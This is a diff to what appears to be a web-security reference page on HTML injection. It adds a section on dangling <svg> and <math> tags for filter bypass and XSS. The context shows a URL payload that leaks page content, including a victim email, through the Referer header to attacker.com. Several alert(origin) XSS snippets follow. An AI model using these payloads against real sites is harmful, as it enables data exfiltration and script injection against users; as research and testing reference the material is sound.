@@ -256,7 +256,38 @@ It will redirect the victim to the current path with query parameters like:
 
 [https://target.com/vulnerable?html=%3Cimg+src%3Dhttps%3A%2F%2Fattacker.com+referrerpolicy%3Dunsafe-url%3E\&leak=%3Cp%3EYour+email%3A+victim%40example.com%3C%2Fp%3E%0D%0A%3Cdiv+class%3D%22write-note%22%3E%0D%0A++%3Ctextarea%3E](https://target.com/vulnerable?html=%3Cimg+src%3Dhttps%3A%2F%2Fattacker.com+referrerpolicy%3Dunsafe-url%3E\&leak=%3Cp%3EYour+email%3A+victim%40example.com%3C%2Fp%3E%0D%0A%3Cdiv+class%3D%22write-note%22%3E%0D%0A++%3Ctextarea%3E)
 
-Then, the same as with the stored example happens, the injected referer payload leaks the current URL with `&leak=`, and the attacker can decode it from their server logs.
+Then, the same as with the stored example happens, the injected Referer payload leaks the current URL with `&leak=`, and the attacker can decode it from their server logs.
+
+### Dangling `<svg>` or `<math>`
+
+Interesting things can happen when you dangle an [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/svg) or [`<math>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Reference/Element/math) tag, as they **change the HTML namespace** for all following content. This changes how certain syntax is interpreted and may allow you to bypass a filter, or trigger some normally impossible behavior.
+
+* In SVG, [`<script>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/script) tags are supported, and their content is HTML-decoded! This means you can escape string contexts using `&quot;` and other HTML-escapes.
+
+<pre class="language-html"><code class="lang-html"><strong>&#x3C;svg>
+</strong>  &#x3C;script>
+<strong>  	const input = "&#x26;quot;-alert(origin)//";
+</strong>  &#x3C;/script>
+</code></pre>
+
+* In MathML, `<script>` tags are not recognized, so protections like hiding the `nonce=` attribute also also not applied.
+
+{% embed url="https://lab.ctbb.show/research/leaking-csp-nonces-css-mathml" %}
+Short post explaining how to leak CSP nonces with dangling `<math>`
+{% endembed %}
+
+These foreign namespaces are auto-closed when some HTML tags are encountered, specified in:\
+[https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inforeign](https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inforeign)
+
+<pre class="language-html" data-title="Not working"><code class="lang-html">&#x3C;svg>
+<strong>	&#x3C;p>not fine&#x3C;/p>
+</strong>	&#x3C;script>&#x26;#x61;lert(origin)&#x3C;/script>
+</code></pre>
+
+<pre class="language-html" data-title="Working"><code class="lang-html">&#x3C;svg>
+<strong>  &#x3C;a href="/this-is-fine">&#x3C;/a>
+</strong>	&#x3C;script>&#x26;#x61;lert(origin)&#x3C;/script>
+</code></pre>
 
 ## CSS Injection
 
